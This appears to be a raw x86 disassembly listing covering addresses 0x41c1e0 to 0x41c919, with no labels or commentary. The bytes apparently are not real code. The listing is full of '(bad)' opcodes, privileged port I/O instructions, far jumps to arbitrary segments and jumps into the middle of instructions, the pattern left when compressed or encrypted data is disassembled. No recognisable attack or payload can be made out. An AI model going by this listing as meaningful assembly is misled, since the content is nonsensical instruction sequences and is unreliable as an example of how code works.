  41c1e0:	(bad)  [eax-0x7f]
  41c1e3:	xlat   BYTE PTR ds:[ebx]
  41c1e4:	inc    esi
  41c1e5:	(bad)  
  41c1e7:	(bad)  
  41c1e8:	loopne 0x41c1fe
  41c1ea:	cmp    DWORD PTR [esi-0x52],esi
  41c1ed:	es test al,0xee
  41c1f0:	int3   
  41c1f1:	clc    
  41c1f2:	pop    edi
  41c1f3:	aaa    
  41c1f4:	or     DWORD PTR [esi],eax
  41c1f6:	jno    0x41c1cd
  41c1f8:	imul   eax,DWORD PTR [eax-0xa],0x14
  41c1fc:	ror    BYTE PTR [ebx],0xcf
  41c1ff:	stos   DWORD PTR es:[edi],eax
  41c200:	aas    
  41c201:	and    eax,0xfd77383e
  41c206:	aad    0x90
  41c208:	lea    ebp,[edx]
  41c20a:	mov    bl,BYTE PTR [edx+ebx*1-0x10]
  41c20e:	ins    DWORD PTR es:[edi],dx
  41c20f:	push   ss
  41c210:	adc    BYTE PTR [ebp+ecx*8-0x659ced5c],bl
  41c217:	push   0x6b0b8789
  41c21c:	pop    ebp
  41c21d:	shr    BYTE PTR [ebx+ebx*4+0x6523d30d],0xe8
  41c225:	jmp    0x41c1b3
  41c227:	or     ch,cl
  41c229:	adc    BYTE PTR [ecx-0xb],bl
  41c22c:	xchg   edx,eax
  41c22d:	lahf   
  41c22e:	xchg   esp,eax
  41c22f:	lods   eax,DWORD PTR ds:[esi]
  41c230:	fdivr  QWORD PTR [edi-0x14]
  41c233:	pop    ecx
  41c234:	mov    al,0x62
  41c236:	bound  ebp,QWORD PTR [esi+0x4c531e77]
  41c23c:	adc    al,0xa5
  41c23e:	xor    DWORD PTR [edi],ebx
  41c240:	out    0xa8,eax
  41c242:	addr16 or al,0xf2
  41c245:	push   edi
  41c246:	inc    ebx
  41c247:	mov    ah,0x0
  41c249:	and    al,0xcb
  41c24b:	xchg   ebp,eax
  41c24c:	push   esp
  41c24d:	jo     0x41c252
  41c24f:	pop    ebx
  41c250:	inc    eax
  41c251:	adc    eax,DWORD PTR [ebp+0x16]
  41c254:	mov    esi,0x3eb5b9d4
  41c259:	and    al,0xf4
  41c25b:	jb     0x41c201
  41c25d:	jo     0x41c247
  41c25f:	pop    edi
  41c260:	jae    0x6767ddac
  41c266:	or     DWORD PTR [eax-0x6fceffd5],0xffffff8b
  41c26d:	ret    
  41c26e:	sub    esp,ebx
  41c270:	push   0x31
  41c272:	cmc    
  41c273:	cdq    
  41c274:	pop    ebx
  41c275:	inc    eax
  41c276:	xlat   BYTE PTR ds:[ebx]
  41c277:	daa    
  41c278:	ins    BYTE PTR es:[edi],dx
  41c279:	dec    eax
  41c27a:	mov    esp,0xf5f99574
  41c27f:	pop    esp
  41c280:	xor    BYTE PTR es:[ecx-0xa2c59f3],ch
  41c287:	test   eax,0xafa057d8
  41c28c:	xor    al,0x9c
  41c28e:	sub    edx,ebp
  41c290:	xchg   DWORD PTR ss:[ecx],ecx
  41c293:	aad    0x82
  41c295:	sahf   
  41c296:	add    BYTE PTR [ecx+0x56],dh
  41c299:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c29a:	mov    eax,0x9bb99d0d
  41c29f:	xlat   BYTE PTR ds:[ebx]
  41c2a0:	stos   BYTE PTR es:[edi],al
  41c2a1:	pop    ebp
  41c2a2:	mov    ah,0xa9
  41c2a4:	pushw  0x3f10
  41c2a8:	leave  
  41c2a9:	pop    ebx
  41c2aa:	std    
  41c2ab:	(bad)  
  41c2ac:	in     al,dx
  41c2ad:	jle    0x41c25a
  41c2af:	dec    esi
  41c2b0:	jmp    0x9417:0x74e92aff
  41c2b7:	mov    WORD PTR [ebx],gs
  41c2b9:	loop   0x41c2d9
  41c2bb:	rol    BYTE PTR [esi+eiz*2-0x5beb57b5],cl
  41c2c2:	enter  0xe430,0x47
  41c2c6:	call   0xc5934725
  41c2cb:	cmp    DWORD PTR [edi-0x15e5e38f],ebx
  41c2d1:	rcl    esi,0x8f
  41c2d4:	sub    dh,bh
  41c2d6:	sbb    edi,DWORD PTR [edx-0x46183ff1]
  41c2dc:	sub    eax,0x271e3a14
  41c2e1:	inc    edx
  41c2e2:	rcr    DWORD PTR ss:[eax+0x620eaa1d],0x0
  41c2ea:	push   0xfeaf2c4d
  41c2ef:	sbb    ebp,DWORD PTR [esi+0x1953958b]
  41c2f5:	in     al,dx
  41c2f6:	mov    ds:0xfe64ff27,eax
  41c2fb:	outs   dx,BYTE PTR ds:[esi]
  41c2fc:	mov    eax,ds:0xde6af77a
  41c301:	push   cs
  41c302:	or     DWORD PTR [ecx],0x34
  41c305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c306:	das    
  41c307:	stos   BYTE PTR es:[edi],al
  41c308:	(bad)  
  41c309:	sub    al,0xb2
  41c30b:	aad    0xd6
  41c30d:	jge    0x41c2b0
  41c30f:	je     0x41c2cc
  41c311:	xor    BYTE PTR [ecx-0x35],dh
  41c314:	fwait
  41c315:	lea    ebx,[esi+0x1b8875f0]
  41c31b:	add    eax,0x81f8b9ff
  41c320:	or     BYTE PTR [si+0x64],0x4e
  41c325:	add    DWORD PTR [edx-0x9f25784],esp
  41c32b:	jmp    0xe73e5ef7
  41c330:	adc    ebp,DWORD PTR [ebp-0x4a4796fc]
  41c336:	or     eax,0x7bad475d
  41c33b:	mov    dl,0x4b
  41c33d:	or     BYTE PTR cs:[eax+0x59ffee1b],0xa
  41c345:	dec    edx
  41c346:	arpl   WORD PTR [edx-0x45],cx
  41c349:	(bad)  
  41c34a:	adc    DWORD PTR [ecx-0x17],edi
  41c34d:	ficom  DWORD PTR [ebx+0x17e889f0]
  41c353:	(bad)  
  41c354:	adc    eax,0xefe4935
  41c359:	test   al,0x88
  41c35b:	repz mov ah,0x97
  41c35e:	push   esp
  41c35f:	stos   BYTE PTR es:[edi],al
  41c360:	xor    al,BYTE PTR [edx+0x6df76426]
  41c366:	jmp    0x41c3d6
  41c368:	xchg   BYTE PTR [edx+0x14],cl
  41c36b:	lahf   
  41c36c:	mov    ebx,esi
  41c36e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c36f:	test   BYTE PTR [ecx],al
  41c371:	data16 fnstsw WORD PTR [eax]
  41c374:	lahf   
  41c375:	sbb    esi,edi
  41c377:	loopne 0x41c38f
  41c379:	lea    edx,[edx]
  41c37b:	sbb    BYTE PTR [edi-0x64ee9dcc],bh
  41c381:	mov    ah,0x5e
  41c383:	loopne 0x41c324
  41c385:	ficomp WORD PTR [edi]
  41c387:	cmp    al,0xe0
  41c389:	dec    ebp
  41c38a:	(bad)  
  41c38b:	(bad)  
  41c38c:	lock mov cl,0x79
  41c38f:	repz test BYTE PTR cs:[esi+eax*4+0x3a],dl
  41c395:	or     eax,0x6c3954e8
  41c39a:	repz in al,dx
  41c39c:	scas   al,BYTE PTR es:[edi]
  41c39d:	out    dx,al
  41c39e:	xchg   ebx,eax
  41c39f:	jno    0x41c3f2
  41c3a1:	cmp    BYTE PTR [ebx+0x5c],cl
  41c3a4:	xlat   BYTE PTR ds:[ebx]
  41c3a5:	jge    0x41c398
  41c3a7:	dec    edx
  41c3a8:	adc    bl,BYTE PTR [ecx]
  41c3aa:	fidivr WORD PTR [edi]
  41c3ac:	mov    ebp,0x2c733649
  41c3b1:	and    DWORD PTR [ebx+ecx*2+0x5],edi
  41c3b5:	sti    
  41c3b6:	outs   dx,DWORD PTR ds:[esi]
  41c3b7:	daa    
  41c3b8:	and    BYTE PTR [eax],bh
  41c3ba:	or     bl,BYTE PTR [edi*1+0x30e04627]
  41c3c1:	ror    BYTE PTR [ecx-0x4a],0x6a
  41c3c5:	cli    
  41c3c6:	push   edx
  41c3c7:	push   edi
  41c3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3c9:	xchg   esi,eax
  41c3ca:	dec    edi
  41c3cb:	inc    edi
  41c3cc:	mov    ds:0x131df67a,al
  41c3d1:	test   BYTE PTR [edi+edi*2-0x53d633ed],0x56
  41c3d9:	mov    ds:0xb1fc7edc,al
  41c3de:	xchg   esi,eax
  41c3df:	sub    dh,BYTE PTR [eax]
  41c3e1:	and    al,0xf2
  41c3e3:	pop    ds
  41c3e4:	leave  
  41c3e5:	pusha  
  41c3e6:	mov    al,ds:0x496554b5
  41c3eb:	adc    edi,ebx
  41c3ed:	aad    0x9
  41c3ef:	cmp    ah,ah
  41c3f1:	dec    esp
  41c3f2:	xor    dl,BYTE PTR [edi-0x751380de]
  41c3f8:	inc    edi
  41c3f9:	call   DWORD PTR [edx-0x73]
  41c3fc:	xchg   BYTE PTR [ebx+0x21725585],ah
  41c402:	addr16 mov cl,0x30
  41c405:	cld    
  41c406:	push   ebx
  41c407:	dec    eax
  41c408:	inc    esp
  41c409:	ret    
  41c40a:	in     eax,0xa3
  41c40c:	mov    al,ds:0x3baf6f3c
  41c411:	loopne 0x41c41f
  41c413:	mov    ch,dl
  41c415:	push   edi
  41c416:	repz push ebx
  41c418:	out    0xf5,eax
  41c41a:	push   esp
  41c41b:	sbb    DWORD PTR ss:[bp+si],ebx
  41c41f:	jle    0x41c41c
  41c421:	xor    DWORD PTR gs:[edx-0x41],ebx
  41c425:	das    
  41c426:	bound  edx,QWORD PTR [edx+0x6ac04130]
  41c42c:	xchg   ebp,eax
  41c42d:	test   eax,0x8138db45
  41c432:	inc    eax
  41c433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c434:	jmp    FWORD PTR [eax+0x5f93c60b]
  41c43a:	fcom   QWORD PTR [ebx-0x1953faf8]
  41c440:	mov    eax,0xfd9cf15c
  41c445:	sub    ebp,DWORD PTR [eax-0x77]
  41c448:	stos   BYTE PTR es:[edi],al
  41c449:	adc    DWORD PTR [eax],esi
  41c44b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c44c:	cs sti 
  41c44e:	dec    ebp
  41c44f:	(bad)  
  41c450:	aam    0x4d
  41c452:	pop    esp
  41c453:	add    al,0x83
  41c455:	mov    ecx,0xd0d8b798
  41c45a:	mov    ds:0x24048c66,eax
  41c45f:	xor    DWORD PTR [ecx+ebx*2+0x2ac6a81a],esi
  41c466:	cdq    
  41c467:	jge    0x41c3ed
  41c469:	mov    dh,0x9c
  41c46b:	cmp    al,0x34
  41c46d:	outs   dx,DWORD PTR ds:[esi]
  41c46e:	sbb    ebp,ebx
  41c470:	jge    0x41c47b
  41c472:	jecxz  0x41c4af
  41c474:	jns    0x41c4c6
  41c476:	scas   eax,DWORD PTR es:[edi]
  41c477:	push   ss
  41c478:	inc    esp
  41c479:	push   ebx
  41c47a:	xchg   ecx,eax
  41c47b:	daa    
  41c47c:	popa   
  41c47d:	dec    esi
  41c47e:	sub    DWORD PTR [esi+0x1b39659b],ebx
  41c484:	lock jl 0x41c45e
  41c487:	cmp    eax,0x6cc6a636
  41c48c:	(bad)  
  41c48d:	adc    dl,bh
  41c48f:	shl    DWORD PTR [ebx+0x407eee9b],0x87
  41c496:	mov    ah,0x39
  41c498:	mov    dl,0x5e
  41c49a:	jns    0x41c491
  41c49c:	outs   dx,DWORD PTR ds:[esi]
  41c49d:	xchg   DWORD PTR [ebx+edx*4+0x1f],eax
  41c4a1:	sar    DWORD PTR [edx],cl
  41c4a3:	adc    al,BYTE PTR [edx]
  41c4a5:	xchg   ebx,eax
  41c4a6:	push   ds
  41c4a7:	or     esi,DWORD PTR [eax-0x250ef337]
  41c4ad:	add    ebx,DWORD PTR [ebx]
  41c4af:	mov    ds:0xf8486d4a,eax
  41c4b4:	leave  
  41c4b5:	mov    ecx,0xb3c0a3d9
  41c4ba:	jg     0x41c490
  41c4bc:	dec    eax
  41c4bd:	sbb    eax,0x8d8c77a6
  41c4c2:	and    al,0x40
  41c4c4:	leave  
  41c4c5:	rcr    esi,0x8c
  41c4c8:	push   ecx
  41c4c9:	cmp    ecx,DWORD PTR [ecx-0x1e]
  41c4cc:	retf   
  41c4cd:	sub    DWORD PTR [ecx+0x53],edi
  41c4d0:	bound  esi,QWORD PTR [esi]
  41c4d2:	gs dec edx
  41c4d4:	xchg   esi,eax
  41c4d5:	adc    BYTE PTR [ebx+ebx*4],cl
  41c4d8:	div    esi
  41c4da:	xchg   DWORD PTR [ebp+0x1870d1ae],edx
  41c4e0:	aam    0xdd
  41c4e2:	ds out 0x74,eax
  41c4e5:	imul   ecx,ebp,0xfffffff4
  41c4e8:	jb     0x41c521
  41c4ea:	scas   eax,DWORD PTR es:[edi]
  41c4eb:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4ed:	sub    DWORD PTR [esi+0x26],ebp
  41c4f0:	or     eax,0x732b33a3
  41c4f5:	sbb    DWORD PTR [ebx+0x286e59f9],edi
  41c4fb:	(bad)  
  41c4fc:	xor    BYTE PTR [esi],cl
  41c4fe:	outs   dx,BYTE PTR ds:[esi]
  41c4ff:	xchg   ecx,eax
  41c500:	lods   eax,DWORD PTR ds:[esi]
  41c501:	stc    
  41c502:	int    0x4b
  41c504:	push   ds
  41c505:	call   0x8d04a08c
  41c50a:	adc    ebp,DWORD PTR [ebp-0x20d4933e]
  41c510:	retf   0x1dd0
  41c513:	pop    ebx
  41c514:	mov    ds:0x316e6f76,eax
  41c519:	dec    esp
  41c51a:	mov    bh,0xdf
  41c51c:	sbb    BYTE PTR [ebp-0x7b],bh
  41c51f:	add    bl,bl
  41c521:	sbb    eax,DWORD PTR [esi]
  41c523:	hlt    
  41c524:	jno    0x41c4be
  41c526:	mov    ds,WORD PTR [edx]
  41c528:	push   eax
  41c529:	das    
  41c52a:	xor    DWORD PTR [eax+edi*4-0x37],eax
  41c52e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c52f:	dec    esi
  41c530:	out    0xa4,eax
  41c532:	out    0xe3,al
  41c534:	cmc    
  41c535:	call   0x85d3:0x5e4a9def
  41c53c:	iret   
  41c53d:	aad    0x5
  41c53f:	mov    ch,0x77
  41c541:	nop
  41c542:	dec    edi
  41c543:	xchg   edx,eax
  41c544:	cmp    eax,0xebb7f3cc
  41c549:	cmp    ebp,ecx
  41c54b:	xlat   BYTE PTR ds:[ebx]
  41c54c:	jbe    0x41c5b7
  41c54e:	push   ebp
  41c54f:	(bad)  
  41c550:	repnz or eax,0x8989ce9e
  41c556:	or     ecx,DWORD PTR [edi-0x20]
  41c559:	and    DWORD PTR [edx+0x8],edx
  41c55c:	mov    edi,ebp
  41c55e:	mov    ch,0x57
  41c560:	mov    eax,0x96b21ca9
  41c565:	ds pop es
  41c567:	cli    
  41c568:	jnp    0x41c515
  41c56a:	nop
  41c56b:	pop    esp
  41c56c:	scas   al,BYTE PTR es:[edi]
  41c56d:	pushf  
  41c56e:	or     DWORD PTR [ebp+0x6591324a],edi
  41c574:	ds cmp eax,0xa5fcfc29
  41c57a:	int    0x16
  41c57c:	loop   0x41c534
  41c57e:	push   cs
  41c57f:	mov    eax,ds:0x53b6992c
  41c584:	cmp    eax,0xb30bb3a3
  41c589:	popf   
  41c58a:	xchg   esp,eax
  41c58b:	daa    
  41c58c:	inc    ebp
  41c58d:	rcl    DWORD PTR [ebp-0x616e22bc],cl
  41c593:	call   0x618c1e6c
  41c598:	(bad)  
  41c59a:	mov    cl,0x56
  41c59c:	push   esp
  41c59d:	cmp    DWORD PTR ds:0xc5789629,edx
  41c5a3:	stos   DWORD PTR es:[edi],eax
  41c5a4:	stc    
  41c5a5:	(bad)  
  41c5a6:	je     0x41c5a7
  41c5a8:	mul    DWORD PTR [edx]
  41c5aa:	das    
  41c5ab:	cld    
  41c5ac:	mov    dh,0xeb
  41c5ae:	push   ebx
  41c5af:	inc    ebp
  41c5b0:	ret    
  41c5b1:	imul   ebx,DWORD PTR [edi],0xdf5c461f
  41c5b7:	imul   edi,DWORD PTR [ecx-0x5ad113d3],0xfffffffe
  41c5be:	jne    0x41c5dd
  41c5c0:	rol    BYTE PTR [ebp+0x7],0xeb
  41c5c4:	mov    cl,0x38
  41c5c6:	xor    BYTE PTR [eax+0x20],0xa3
  41c5ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5cb:	inc    ebx
  41c5cc:	fucomip st,st(0)
  41c5ce:	cmp    DWORD PTR ds:[edi+0xb],edx
  41c5d2:	xor    eax,0x94f72e5
  41c5d7:	mov    eax,0xf5cf1e70
  41c5dc:	sbb    al,0x71
  41c5de:	fcmovnb st,st(2)
  41c5e0:	mov    esp,0x5a9aa2c8
  41c5e5:	mov    al,ds:0x2eff3842
  41c5ea:	mov    ecx,0x9509981c
  41c5ef:	clc    
  41c5f0:	inc    BYTE PTR [ecx+0xc]
  41c5f3:	addr16 xor eax,0xc181fc07
  41c5f9:	pop    ebx
  41c5fa:	fadd   QWORD PTR [ecx+0x2af6a6f6]
  41c600:	ds iret 
  41c602:	dec    ebp
  41c603:	push   0x5f
  41c605:	ret    0xb777
  41c608:	cmp    al,0xc0
  41c60a:	fdivr  DWORD PTR [esi-0x53]
  41c60d:	jle    0x41c59a
  41c60f:	ins    BYTE PTR es:[edi],dx
  41c610:	ss inc ecx
  41c612:	mov    eax,0xfebee2ef
  41c617:	rol    BYTE PTR ds:0x8aa5733,1
  41c61d:	dec    ecx
  41c61e:	jg     0x41c63e
  41c620:	dec    eax
  41c621:	(bad)  
  41c622:	cld    
  41c623:	mov    BYTE PTR [esi-0x28ac3366],bh
  41c629:	mov    esi,DWORD PTR [eax]
  41c62b:	dec    BYTE PTR [ebp+0x1fb68813]
  41c631:	dec    ecx
  41c632:	popfw  
  41c634:	ret    
  41c635:	out    0xfb,eax
  41c637:	lock lods eax,DWORD PTR ds:[esi]
  41c639:	(bad)  
  41c63a:	lahf   
  41c63b:	or     edi,ebp
  41c63d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c63e:	pop    eax
  41c63f:	sbb    ah,bl
  41c641:	outs   dx,DWORD PTR ds:[esi]
  41c642:	out    dx,eax
  41c643:	(bad)  
  41c644:	loopne 0x41c622
  41c646:	sub    cl,cl
  41c648:	(bad)  
  41c649:	in     eax,0x72
  41c64b:	call   0x6c12:0x9f02955f
  41c652:	aad    0x80
  41c654:	mov    bh,0x43
  41c656:	sahf   
  41c657:	test   bl,bl
  41c659:	repnz popf 
  41c65b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c65c:	push   cs
  41c65d:	ret    
  41c65e:	call   DWORD PTR [edi+0x26]
  41c661:	mov    cs,esi
  41c663:	dec    esp
  41c664:	mov    BYTE PTR [eax+ebp*8-0x1],0x0
  41c669:	and    edi,ebp
  41c66b:	in     eax,dx
  41c66c:	mov    eax,ds:0x3e0e42e2
  41c671:	test   al,0x7d
  41c673:	push   ss
  41c674:	sahf   
  41c675:	nop
  41c676:	cdq    
  41c677:	mov    dh,0xb4
  41c679:	call   DWORD PTR [ebp+0x69]
  41c67c:	xor    ecx,edi
  41c67e:	jle    0x41c6d9
  41c680:	mov    ch,0xae
  41c682:	outs   dx,DWORD PTR ds:[esi]
  41c683:	sbb    al,0xae
  41c685:	repnz lods al,BYTE PTR ds:[esi]
  41c687:	pushf  
  41c688:	and    eax,0xcfea75f0
  41c68d:	outs   dx,BYTE PTR ds:[esi]
  41c68e:	xor    al,0x39
  41c690:	stc    
  41c691:	xor    cl,BYTE PTR [ecx+0x4d]
  41c694:	shl    DWORD PTR [ecx+ecx*8],1
  41c697:	rcl    BYTE PTR [esi+0x2f],0x47
  41c69b:	jnp    0x41c669
  41c69d:	fbld   TBYTE PTR [eax-0x57]
  41c6a0:	mul    DWORD PTR [edx]
  41c6a2:	cmp    al,0xe4
  41c6a4:	out    0x29,eax
  41c6a6:	ss loop 0x41c6d2
  41c6a9:	je     0x41c639
  41c6ab:	sahf   
  41c6ac:	sub    edx,DWORD PTR [edi-0x32]
  41c6af:	ror    DWORD PTR [ecx],1
  41c6b1:	imul   ecx,DWORD PTR [edx+0x15b1bf42],0x90e66e2d
  41c6bb:	in     al,0xd1
  41c6bd:	cmp    eax,0xfbb58d4
  41c6c2:	jae    0x41c6da
  41c6c4:	jmp    0x2b806185
  41c6c9:	sbb    eax,DWORD PTR [edx+0x6a]
  41c6cc:	dec    esi
  41c6cd:	int    0x40
  41c6cf:	xlat   BYTE PTR ds:[ebx]
  41c6d0:	pushf  
  41c6d1:	popf   
  41c6d2:	neg    bh
  41c6d4:	(bad)  
  41c6d5:	fdiv   DWORD PTR [ebx+esi*4+0x13c53563]
  41c6dc:	xchg   edi,eax
  41c6dd:	lods   eax,DWORD PTR ds:[esi]
  41c6de:	mov    dl,0x62
  41c6e0:	loope  0x41c723
  41c6e2:	push   esi
  41c6e3:	mov    ds:0x8473cb84,al
  41c6e8:	or     DWORD PTR [ecx+0x1dc8c38a],edi
  41c6ee:	jne    0x41c737
  41c6f0:	(bad)  [ecx]
  41c6f2:	mov    ds:0x9e17fc32,al
  41c6f7:	pop    ds
  41c6f8:	dec    ebx
  41c6f9:	fldenv [edx-0x1d3b4b9d]
  41c6ff:	cmp    eax,0xe00ad65e
  41c704:	in     al,dx
  41c705:	nop
  41c706:	fldenv [esi+0x39]
  41c709:	pop    ds
  41c70a:	xlat   BYTE PTR ds:[ebx]
  41c70b:	cmc    
  41c70c:	dec    edx
  41c70d:	xchg   edx,eax
  41c70e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c70f:	ins    DWORD PTR es:[edi],dx
  41c710:	and    BYTE PTR [esi],bl
  41c712:	add    esp,edx
  41c714:	(bad)  
  41c716:	into   
  41c717:	cmp    bl,BYTE PTR [eax-0x65]
  41c71a:	pop    ds
  41c71b:	cmp    al,0x5
  41c71d:	(bad)  
  41c71e:	icebp  
  41c71f:	bound  ebp,QWORD PTR [ebp-0x742d8c03]
  41c725:	mov    esi,0xfc273c8c
  41c72a:	data16 int 0x99
  41c72d:	inc    esi
  41c72e:	adc    al,0x8a
  41c730:	mov    bl,0xd1
  41c732:	sub    BYTE PTR [edi-0x19],dl
  41c735:	gs push esi
  41c737:	pop    edx
  41c738:	cmp    ecx,esi
  41c73a:	nop
  41c73b:	fyl2x  
  41c73d:	loop   0x41c720
  41c73f:	sahf   
  41c740:	test   eax,0x60e8ada0
  41c745:	outs   dx,BYTE PTR ds:[esi]
  41c746:	jp     0x41c6dc
  41c748:	int    0xac
  41c74a:	mov    bh,0xe8
  41c74c:	mov    ebx,DWORD PTR [esi+0x6f9cabe2]
  41c752:	sub    cl,BYTE PTR [edi+0x50]
  41c755:	jb     0x41c733
  41c757:	clc    
  41c758:	push   es
  41c759:	xor    eax,0x6485649c
  41c75e:	xchg   eax,edx
  41c760:	adc    DWORD PTR [ebp+0x240da921],edi
  41c766:	mov    al,0xf6
  41c768:	cmp    eax,0x84afe87f
  41c76d:	ins    BYTE PTR es:[edi],dx
  41c76e:	cmp    al,0xc4
  41c770:	addr16 (bad) 
  41c772:	xchg   esp,eax
  41c773:	jnp    0x41c76d
  41c775:	xchg   ebp,eax
  41c776:	mov    ds:0x13fa50d9,al
  41c77b:	cmp    DWORD PTR ds:0x346a8d6a,0x6c
  41c782:	(bad)  
  41c783:	and    ch,BYTE PTR ds:0x7be21a6e
  41c789:	dec    ecx
  41c78a:	fnsave [esi+ebx*2]
  41c78d:	xor    BYTE PTR [edi-0x21bd71b],ah
  41c793:	in     eax,0x3e
  41c795:	add    DWORD PTR [eax+0x1a],eax
  41c798:	lea    eax,[edx]
  41c79a:	dec    edx
  41c79b:	sub    DWORD PTR [edx+0x17],0x14ad58ef
  41c7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7a3:	mov    ebx,0x5f4067c0
  41c7a8:	repnz test al,0x7
  41c7ab:	pop    ecx
  41c7ac:	jmp    0x41c7a7
  41c7ae:	fild   WORD PTR [ecx-0x43ef661c]
  41c7b4:	jb     0x41c761
  41c7b6:	adc    al,0xb4
  41c7b8:	sbb    al,0xf6
  41c7ba:	rol    bh,1
  41c7bc:	mov    al,ds:0x8534e808
  41c7c1:	and    BYTE PTR [esi+esi*8],al
  41c7c4:	push   0x57
  41c7c6:	push   cs
  41c7c7:	adc    eax,0xacd138c
  41c7cc:	pop    ds
  41c7cd:	and    BYTE PTR [esi-0x6d],0xd3
  41c7d1:	push   edi
  41c7d2:	and    dl,dl
  41c7d4:	adc    edx,edi
  41c7d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7d7:	dec    esp
  41c7d8:	(bad)  
  41c7d9:	cmp    DWORD PTR [esi-0x5f],esi
  41c7dc:	push   ds
  41c7dd:	repz or eax,0x86de96ca
  41c7e3:	and    BYTE PTR [edi-0x3f],bl
  41c7e6:	in     al,0x91
  41c7e8:	jmp    0x918b:0x50f3
  41c7ee:	cs jb  0x41c7b1
  41c7f1:	rcr    BYTE PTR [eax+ebp*8],0x6c
  41c7f5:	repz scas eax,DWORD PTR es:[edi]
  41c7f7:	sbb    DWORD PTR [edx],ecx
  41c7f9:	call   0x958ba2b5
  41c7fe:	fcomp  DWORD PTR [edx+0x1a]
  41c801:	inc    ebp
  41c802:	jae    0x41c832
  41c804:	xchg   esi,eax
  41c805:	and    al,BYTE PTR [edx]
  41c807:	mov    al,bl
  41c809:	lock xor al,0x37
  41c80c:	sbb    esp,ebx
  41c80e:	or     DWORD PTR [esi+0x1da502a1],ebx
  41c814:	mov    eax,0x703ad061
  41c819:	jb     0x41c880
  41c81b:	dec    ebp
  41c81c:	pop    esi
  41c81d:	fist   DWORD PTR [esi-0x38]
  41c820:	push   ebx
  41c821:	in     eax,dx
  41c822:	retf   
  41c823:	sahf   
  41c824:	out    dx,al
  41c825:	and    ebp,esi
  41c827:	cmp    al,0x38
  41c829:	adc    ebx,DWORD PTR [ebp+0x5ee7dbeb]
  41c82f:	mov    ch,0x8c
  41c831:	add    ebx,DWORD PTR [ebx]
  41c833:	mov    edi,0xf600b6e5
  41c838:	xor    BYTE PTR [ebp+0x7a],cl
  41c83b:	aaa    
  41c83c:	scas   eax,DWORD PTR es:[edi]
  41c83d:	push   esp
  41c83e:	xlat   BYTE PTR ds:[ebx]
  41c83f:	pop    esp
  41c840:	dec    esi
  41c841:	mov    cl,0x27
  41c843:	dec    eax
  41c844:	leave  
  41c845:	popa   
  41c846:	pop    ds
  41c847:	pop    esp
  41c848:	mov    esp,0xb7e5fe15
  41c84d:	test   DWORD PTR [edi+0x2ef63ab5],esp
  41c853:	add    bh,BYTE PTR [edi+0x23]
  41c856:	icebp  
  41c857:	ss aas 
  41c859:	xor    al,0x53
  41c85b:	or     ch,BYTE PTR [edi]
  41c85d:	cmp    al,0x6a
  41c85f:	cmp    ecx,DWORD PTR [edx]
  41c861:	(bad)  
  41c862:	out    0xa8,eax
  41c864:	sbb    esp,DWORD PTR [eax+0x595d4511]
  41c86a:	jg     0x41c844
  41c86c:	push   ds
  41c86d:	neg    BYTE PTR [esp+0x78]
  41c871:	dec    eax
  41c872:	dec    ebp
  41c873:	or     eax,0x4d40b2df
  41c878:	addr16 gs xchg edi,eax
  41c87b:	push   ds
  41c87c:	and    ebx,DWORD PTR [eax+edi*2-0x2c]
  41c880:	dec    ebx
  41c881:	pop    esp
  41c882:	sub    DWORD PTR [ebx+0x54],eax
  41c885:	in     eax,dx
  41c886:	adc    ch,BYTE PTR [esi]
  41c888:	xor    bh,dh
  41c88a:	cmp    ah,BYTE PTR [esi]
  41c88c:	(bad)  
  41c88d:	push   ss
  41c88e:	xor    esi,DWORD PTR [ebp+0x26]
  41c891:	sub    bh,BYTE PTR [eax]
  41c893:	bound  ebx,QWORD PTR [ecx]
  41c895:	addr16 stc 
  41c897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c898:	(bad)  
  41c899:	cmp    al,0x7c
  41c89b:	cmp    DWORD PTR ds:0xd016c3ca,esi
  41c8a1:	inc    ch
  41c8a3:	xlat   BYTE PTR ds:[ebx]
  41c8a4:	mov    al,0xc
  41c8a6:	or     DWORD PTR [ebx+0x188ff5fb],0xb2bf9055
  41c8b0:	adc    eax,0xb984a3e5
  41c8b5:	adc    DWORD PTR [edi],eax
  41c8b7:	retf   0x7919
  41c8ba:	(bad)  
  41c8bb:	jbe    0x41c8fb
  41c8bd:	mov    BYTE PTR [ecx+ebp*8],dl
  41c8c0:	shl    BYTE PTR [eax+0x294923a7],0x1f
  41c8c7:	pop    ss
  41c8c8:	test   BYTE PTR [esi],bh
  41c8ca:	jb     0x41c93d
  41c8cc:	or     ecx,esi
  41c8ce:	or     BYTE PTR [edx+0x12069caa],ch
  41c8d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8d5:	daa    
  41c8d6:	pushf  
  41c8d7:	xor    esp,DWORD PTR [ebx-0x2a933b32]
  41c8dd:	rol    DWORD PTR [edi],1
  41c8df:	push   esp
  41c8e0:	fadd   QWORD PTR [ecx-0x3b4dc338]
  41c8e6:	mov    ch,BYTE PTR [edi]
  41c8e8:	addr16 jmp 0xaf29c91e
  41c8ee:	sub    eax,0xef6ac0a7
  41c8f3:	aad    0xd3
  41c8f5:	in     al,0x41
  41c8f7:	jne    0x41c8ad
  41c8f9:	push   ebx
  41c8fa:	retf   
  41c8fb:	sub    dl,BYTE PTR [eax]
  41c8fd:	sub    eax,0xd401ccd9
  41c902:	jl     0x41c8b3
  41c904:	pusha  
  41c905:	bound  edi,QWORD PTR [ecx-0xf]
  41c908:	popa   
  41c909:	dec    edx
  41c90a:	outs   dx,DWORD PTR ds:[esi]
  41c90b:	into   
  41c90c:	or     eax,0x2dc5ca90
  41c911:	(bad)  
  41c912:	(bad)  
  41c914:	loopne 0x41c96e
  41c916:	add    al,0x24
  41c918:	pop    edi
  41c919:	mov    BYTE PTR [edx+0x32581807],ch
